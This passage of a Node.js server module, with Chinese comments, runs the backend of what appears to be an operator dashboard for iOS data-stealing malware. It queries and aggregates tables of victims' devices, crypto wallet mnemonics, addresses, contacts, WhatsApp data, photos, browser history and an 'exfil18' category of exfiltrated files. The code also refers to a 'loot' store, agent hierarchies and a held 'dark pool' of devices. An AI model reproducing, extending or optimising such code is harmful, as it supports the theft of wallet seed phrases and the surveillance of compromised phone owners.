    // 【2026-09-20·提速】同 photo：g 并行聚合 + lip（DISTINCT ON 走覆盖索引）
    const r = await pool.query(`
      WITH g AS (
        SELECT e.serial, count(*)::int AS total,
               count(*) FILTER (WHERE COALESCE(e.phones,'') <> '')::int AS phone,
               count(*) FILTER (WHERE COALESCE(e.emails,'') <> '')::int AS email,
               max(e.ts) AS last_ts
        FROM contacts e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial),
      lip AS (
        SELECT DISTINCT ON (e.serial) e.serial, host(e.ip) AS ip
        FROM contacts e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        ORDER BY e.serial, e.ts DESC)
      SELECT g.serial, g.total, g.phone, g.email, g.last_ts,
        COALESCE(d.machine, '') AS machine, COALESCE(d.ios_version, '') AS ios_version,
        COALESCE(lip.ip, host(d.ip), '') AS ip, COALESCE(d.last_seen, g.last_ts, 0) AS last_seen, COUNT(*) OVER() AS _total
      FROM g LEFT JOIN lip ON lip.serial = g.serial LEFT JOIN devices d ON d.serial = g.serial
      ${KW_W} ${SORT} LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows;
  } else if (kind === 'whatsapp') {
    const r = await pool.query(`
      WITH g AS (
        SELECT e.serial, count(*)::int AS total,
               COALESCE(SUM(CASE WHEN (e.data->>'msg_count') ~ '^[0-9]+$' THEN (e.data->>'msg_count')::bigint ELSE 0 END), 0)::int AS total_msgs,
               max(e.ts) AS last_ts,
               (array_agg(host(e.ip) ORDER BY e.ts DESC NULLS LAST))[1] AS ip
        FROM whatsapp e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
        GROUP BY e.serial)
      SELECT g.serial, g.total, g.total_msgs, g.last_ts, ${ENRICH}, COUNT(*) OVER() AS _total
      ${JOIN} ${KW_W} ${SORT} LIMIT ${$limqw} OFFSET ${$offqw}`, params);
    rows = r.rows;
  } else if (kind === 'exfil18') {
    // 【2026-09-20·提速】预聚合表 exfil18_agg（tools/pg_sync_globals.js exfilagg，5 分钟级/轮）优先：
    //   原每次点击现算 100 万行全表聚合（g 3.5s + ct 1.5s ≈ 5s）→ 读数千行聚合（毫秒级）。
    //   表缺失/为空/异常 → 回退源表实时聚合（同口径，慢但正确）。
    //   ${C} 仅引用 serial/ip（recCondsInto 生成），对 (serial,ip,cat) 组过滤与逐行过滤语义一致。
    const _exAggInner = (isAgg) => isAgg
      ? `SELECT e.serial, e.ip, e.cat, e.n, e.sz, e.last_ts FROM exfil18_agg e WHERE 1=1 ${C}`
      : `SELECT e.serial, e.ip, COALESCE(e.data->>'category','other') AS cat, count(*)::int AS n,
             COALESCE(SUM(COALESCE(NULLIF(regexp_replace(COALESCE(e.data->>'orig_size',''), '[^0-9]', '', 'g'), '')::bigint, 0)), 0)::bigint AS sz,
             max(e.ts) AS last_ts
          FROM exfil18 e WHERE 1=1 ${C} AND e.serial IS NOT NULL AND e.serial <> ''
          GROUP BY e.serial, e.ip, COALESCE(e.data->>'category','other')`;
    const _exBuild = (inner) => `
      WITH a AS (${inner}),
      g AS (SELECT serial, SUM(n)::int AS total, SUM(sz)::bigint AS size, MAX(last_ts) AS last_ts FROM a GROUP BY serial),
      ct AS (SELECT serial, jsonb_object_agg(cat, cn) AS cats FROM (
        SELECT serial, cat, SUM(n)::int AS cn FROM a GROUP BY serial, cat) x GROUP BY serial),
      lip AS (SELECT DISTINCT ON (x.serial) x.serial, x.ip FROM (
        SELECT serial, ip, MAX(last_ts) AS mts FROM a GROUP BY serial, ip) x
        ORDER BY x.serial, x.mts DESC)
      SELECT g.serial, g.total, g.size, g.last_ts, ct.cats,
        COALESCE(d.machine, '') AS machine, COALESCE(d.ios_version, '') AS ios_version,
        COALESCE(host(lip.ip), host(d.ip), '') AS ip, COALESCE(d.last_seen, g.last_ts, 0) AS last_seen, COUNT(*) OVER() AS _total
      FROM g LEFT JOIN ct ON ct.serial = g.serial LEFT JOIN lip ON lip.serial = g.serial LEFT JOIN devices d ON d.serial = g.serial
      ${KW_W} ${SORT} LIMIT ${$limqw} OFFSET ${$offqw}`;
    let r = null;
    try {
      const chk = await pool.query('SELECT EXISTS(SELECT 1 FROM exfil18_agg) AS has');
      if (chk.rows[0] && chk.rows[0].has) r = await pool.query(_exBuild(_exAggInner(true)), params);
    } catch (e) { r = null; }
    if (!r) r = await pool.query(_exBuild(_exAggInner(false)), params);
    rows = r.rows.map(x => {
      const cats = x.cats || {};
      return Object.assign(x, { cats,
        cat_n: Object.keys(cats).length,
        cat_top: Object.entries(cats).sort((a, b) => b[1] - a[1]).slice(0, 4).map(([k, v]) => k + '×' + v).join('  ') });
    });
    const or = await pool.query(`
      SELECT e.ip AS ip, count(*)::int AS n FROM exfil18 e
      WHERE 1=1 ${C} AND (e.serial IS NULL OR e.serial = '')
      GROUP BY e.ip ORDER BY n DESC`, params.slice(0, _cLen));
    const _totE = rows.length ? Number(rows[0]._total) || 0 : 0;
    return { devices: rows.map(x => { const o = Object.assign({}, x, { total: Number(x.total) || 0, last_ts: Number(x.last_ts) || 0, last_seen: Number(x.last_seen) || 0, size: Number(x.size) || 0 }); delete o._total; return o; }),
      orphans: or.rows.map(x => ({ ip: x.ip || '?', n: x.n })),
      pi: { r: rows.length, s: size, p: page, total: _totE } };
  } else {
    return null;
  }
  const _tot = rows.length ? Number(rows[0]._total) || 0 : 0;
  rows = rows.map(x => {
    const o = Object.assign({}, x, {
      total: Number(x.total) || 0,
      last_ts: Number(x.last_ts) || 0,
      last_seen: Number(x.last_seen) || 0,
      ...(x.size !== undefined ? { size: Number(x.size) || 0 } : {}),
    });
    delete o._total;
    return o;
  });
  return { devices: rows, pi: { r: rows.length, s: size, p: page, total: _tot } };
}

// ── 概览统计（P4-4）：权限过滤 + 并行聚合 + 3 分钟缓存 + 并发去重 + 暗池指纹失效【2026-09-19】──
const _statsCache = new Map();
const _statsInflight = new Map();   // 同一 key 的并发计算只跑一次（防预热器/多用户把重查询叠成雪崩）
const _crypto = require('crypto');
async function stats(user) {
  const vis = visibility();
  const exclAll = [...vis.agents];
  const isSuper = user.role === 'super_admin';
  const _vs0 = await vaultSets();   // 30 秒缓存、开销极小；其指纹进缓存 key：暗池任何进出（挂起/放行/入池）立即失效统计
  const vtag = _crypto.createHash('md5').update(_vs0.serials.length + '|' + _vs0.serials.join(',')).digest('hex').slice(0, 10);
  const ck = user.id + '|' + (isSuper ? 'S' : 'A') + '|' + exclAll.join('.') + '|' + vtag;
  // 【2026-09-19】仪表盘口径：超管（admin 与 superadmin）统计强制全量 → 两账号显示完全一致；
  //   该标记只影响本函数内的统计查询，不改列表/通知/余额记录等其它路径的隔离
  if (isSuper) user = Object.assign({}, user, { __statsAll: 1 });
  const compute = () => (async () => {

  const ts0 = new Date(); ts0.setHours(0, 0, 0, 0);
  const t0 = ts0.getTime();
  const t7 = t0 - 6 * 86400000;

  // ① 设备组
  const jobDev = (async () => {
    const params = []; const pv = v => { params.push(v); return '$' + params.length; };
    const condStr = (await devCondsInto(user, params, pv)).map(c => 'AND ' + c).join(' ');
    // 【2026-09-22】仪表盘加"昨日新增"：昨日 00:00 ≤ first_seen < 今日 00:00（与设备总数同口径/同隔离规则）
    const $y0 = pv(t0 - 86400000), $y1 = pv(t0);
    return pool.query(`SELECT
      (SELECT count(*)::int FROM devices d WHERE 1=1 ${condStr}) AS devices,
      (SELECT count(*)::int FROM devices d WHERE 1=1 ${condStr} AND d.first_seen >= ${$y0} AND d.first_seen < ${$y1}) AS y_devices`, params);
  })();
  // ② 今日组（events/mnemonics/addresses）
  const jobToday = (async () => {
    const params = []; const pv = v => { params.push(v); return '$' + params.length; };
    const condStr = (await recCondsInto(user, params, pv)).map(c => 'AND ' + c).join(' ');
    const $t0 = pv(t0);
    return pool.query(`SELECT
      (SELECT count(*)::int FROM events e WHERE e.ts >= ${$t0} ${condStr}) AS today_events,
      (WITH canon AS (SELECT e.id, e.ts FROM (SELECT e.id, e.ts, ROW_NUMBER() OVER (PARTITION BY CASE WHEN COALESCE(e.plain,'') = '' THEN 'id:' || e.id::text ELSE 'p:' || md5(e.plain) END ORDER BY (COALESCE(e.serial,'') <> '') DESC, e.id ASC) AS _rn FROM mnemonics e WHERE 1=1 ${condStr}) e WHERE e._rn = 1)
       SELECT count(*)::int FROM canon c WHERE c.ts >= ${$t0}) AS today_mnemonics,
      (SELECT count(*)::int FROM addresses e WHERE e.ts >= ${$t0} ${condStr}) AS today_addresses`, params);
  })();
  // ③ 总量组（拆 3 条并行，降低单条串行子查询数）
  const totalJob = fields => (async () => {
    const params = []; const pv = v => { params.push(v); return '$' + params.length; };
    const condStr = (await recCondsInto(user, params, pv)).map(c => 'AND ' + c).join(' ');
    const cols = fields.map(([t, a]) => t === 'mnemonics'
      // 【2026-09-15】mnemonics 总量按去重口径（同明文只计最早一条，与列表/按设备聚合一致）
      ? `(WITH canon AS (SELECT e.id FROM (SELECT e.id, ROW_NUMBER() OVER (PARTITION BY CASE WHEN COALESCE(e.plain,'') = '' THEN 'id:' || e.id::text ELSE 'p:' || md5(e.plain) END ORDER BY (COALESCE(e.serial,'') <> '') DESC, e.id ASC) AS _rn FROM mnemonics e WHERE 1=1 ${condStr}) e WHERE e._rn = 1) SELECT count(*)::int FROM canon) AS ${a}`
      : `(SELECT count(*)::int FROM ${t} e WHERE 1=1 ${condStr}) AS ${a}`).join(', ');
    return pool.query(`SELECT ${cols}`, params);
  })();
  const jobTotal1 = totalJob([['addresses', 't_addresses'], ['mnemonics', 't_mnemonics'], ['events', 't_events'], ['reports', 't_reports']]);
  const jobTotal2 = totalJob([['messages', 't_messages'], ['whatsapp', 't_whatsapp'], ['notebooks', 't_notebooks'], ['photos', 't_photos']]);
  const jobTotal3 = totalJob([['browser_history', 't_browser'], ['exfil18', 't_exfil18'], ['chain_logs', 't_chainlogs']]);
  // ④ 7 天趋势（events + mnemonics 两段 UNION）
  const jobTrend = (async () => {
    const params = []; const pv = v => { params.push(v); return '$' + params.length; };
    const condStr = (await recCondsInto(user, params, pv)).map(c => 'AND ' + c).join(' ');
    const $t7 = pv(t7);
    return pool.query(`
      SELECT 'e' AS k, to_char((to_timestamp(ts / 1000))::date, 'FMMM/FMDD') AS day, count(*)::int AS n
        FROM events e WHERE e.ts >= ${$t7} ${condStr} GROUP BY 2
      UNION ALL
      SELECT 'm' AS k, to_char((to_timestamp(c.ts / 1000))::date, 'FMMM/FMDD') AS day, count(*)::int AS n
        FROM (SELECT e.id, e.ts FROM (SELECT e.id, e.ts, ROW_NUMBER() OVER (PARTITION BY CASE WHEN COALESCE(e.plain,'') = '' THEN 'id:' || e.id::text ELSE 'p:' || md5(e.plain) END ORDER BY (COALESCE(e.serial,'') <> '') DESC, e.id ASC) AS _rn FROM mnemonics e WHERE 1=1 ${condStr}) e WHERE e._rn = 1) c
        WHERE c.ts >= ${$t7} GROUP BY 2`, params);
  })();

  const [devR, todayR, tr1, tr2, tr3, trendR] = await Promise.all([jobDev, jobToday, jobTotal1, jobTotal2, jobTotal3, jobTrend]);
  const dev = devR.rows[0] || {}, today = todayR.rows[0] || {};
  const total = Object.assign({}, tr1.rows[0] || {}, tr2.rows[0] || {}, tr3.rows[0] || {});
  const days = [];
  for (let i = 6; i >= 0; i--) {
    const d = new Date(); d.setDate(d.getDate() - i);
    days.push({ day: (d.getMonth() + 1) + '/' + d.getDate(), events: 0, mnemonics: 0 });
  }
  const dm = new Map(days.map(x => [x.day, x]));
  for (const r of trendR.rows) { const d2 = dm.get(r.day); if (d2) { if (r.k === 'e') d2.events = r.n; else d2.mnemonics = r.n; } }

  const data = {
    today_events_count: today.today_events || 0,
    today_mnemonics_count: today.today_mnemonics || 0,
    today_addresses_count: today.today_addresses || 0,
    total_addresses_count: total.t_addresses || 0,
    total_mnemonics_count: total.t_mnemonics || 0,
    total_devices_count: dev.devices || 0,
    yesterday_devices_count: dev.y_devices || 0,
    total_users_count: dev.devices || 0,
    total_events_count: total.t_events || 0,
    total_reports_count: total.t_reports || 0,
    total_messages_count: total.t_messages || 0,
    total_whatsapp_count: total.t_whatsapp || 0,
    total_notebooks_count: total.t_notebooks || 0,
    total_photos_count: total.t_photos || 0,
    total_browser_history_count: total.t_browser || 0,
    total_exfil18_count: total.t_exfil18 || 0,
    total_chain_logs_count: total.t_chainlogs || 0,
    trend: days,
  };
    _statsCache.set(ck, { t: Date.now(), data });
    if (_statsCache.size > 200) _statsCache.clear();
    return data;
  })();
  // ── 【2026-09-19 复审·C1 stale-while-revalidate】有缓存值就秒回（哪怕已过期），后台单飞刷新：
  //   旧行为=过期后请求同步等重算（冷算实测 5.4s，负载叠加时被拖过 nginx 60s 上游超时，为当日 600+ 次 504 根因之一）。
  //   刷新失败仅记日志，继续供应上次数据（仪表盘统计容忍分钟级滞后，不接受分钟级等待）。
  const hit = _statsCache.get(ck);
  if (hit) {
    if (Date.now() - hit.t >= 180000 && !_statsInflight.get(ck)) {
      const rp = compute();
      _statsInflight.set(ck, rp);
      rp.finally(() => _statsInflight.delete(ck)).catch(() => {});
      rp.catch(e => console.error('[panel] stats 后台刷新失败:', e.message));
    }
    return hit.data;
  }
  const inflight = _statsInflight.get(ck);
  if (inflight) return inflight;   // 冷启动（服务重启/暗池变更换 key）并发单飞
  const p = compute();
  _statsInflight.set(ck, p);
  try { return await p; } finally { _statsInflight.delete(ck); }
}

/** 用户可见设备 serial 集合（walletDiag 等"按可见设备过滤"的场景用） */
async function visibleSerials(user) {
  const params = []; const pv = v => { params.push(v); return '$' + params.length; };
  const conds = await devCondsInto(user, params, pv);
  const where = conds.length ? 'WHERE ' + conds.join(' AND ') : '';
  const r = await pool.query(`SELECT d.serial FROM devices d ${where}`, params);
  return new Set(r.rows.map(x => x.serial));
}

// 【2026-09-20 新增】"IP与访问"栏 IP 数据：读预聚合表 ip_summary（tools/pg_sync_globals.js ipsum，5 分钟级/轮）。
//   原路径依赖 lootStore 快照 core.ipData（180 分钟新鲜度门槛 + 快照构建曾 OOM 停摆）→ 该栏曾长期空白。
//   权限：recCondsInto 条件仅引用 serial/ip → 对 (ip, serial) 组过滤与逐行记录过滤语义一致（含 IP 通道/专属/暗池）。
//   【2026-09-20 更新】后端分页（s/p）：原全量 3.4 万条传输 → 每页 20 条 + total 计数。
async function ipDataList(user, q) {
  const qq = q || {};
  const size = Math.min(2000, Math.max(1, parseInt(qq.s || '20', 10) || 20));
  const page = Math.max(0, parseInt(qq.p || '0', 10) || 0);
  const params = []; const pv = v => { params.push(v); return '$' + params.length; };
  const C = (await recCondsInto(user, params, pv, 'e')).map(c => 'AND ' + c).join(' ');
  const cnt = await pool.query(`SELECT count(DISTINCT e.ip)::int AS n FROM ip_summary e WHERE 1=1 ${C}`, params);
  const total = Number(cnt.rows[0] && cnt.rows[0].n) || 0;
  const $lim = pv(size); const $off = pv(page * size);
  const r = await pool.query(`
    SELECT host(e.ip) AS ip, count(DISTINCT e.serial) FILTER (WHERE e.serial <> '')::int AS device_count,
           SUM(e.report_n)::int AS report_count, SUM(e.delivery_n)::int AS delivery_count,
           string_agg(DISTINCT e.serial, ', ') FILTER (WHERE e.serial <> '') AS devices,
           MIN(NULLIF(e.first_ts, 0)) AS first_ts, MAX(e.last_ts) AS last_ts
    FROM ip_summary e WHERE 1=1 ${C}
    GROUP BY e.ip ORDER BY MAX(e.last_ts) DESC LIMIT ${$lim} OFFSET ${$off}`, params);
  const ipds = r.rows.map((x, i) => ({
    id: page * size + i + 1, ip: x.ip || '',
    report_count: Number(x.report_count) || 0,
    device_count: Number(x.device_count) || 0,
    devices: String(x.devices || '').split(', ').filter(Boolean).slice(0, 8).join(', '),
    delivery_count: Number(x.delivery_count) || 0,
    first_ts: Number(x.first_ts) || 0,
    last_ts: Number(x.last_ts) || 0,
    ts: Number(x.last_ts) || 0,
  }));
  return { ipds, pi: { r: ipds.length, s: size, p: page, total } };
}

module.exports = { deviceList, deviceListStats, deviceDetail, recList, recPage, stats, summary, findRecord, visibleSerials, ipDataList, REC, visibility, subtreeIds, agentMap, balances, balanceStats };
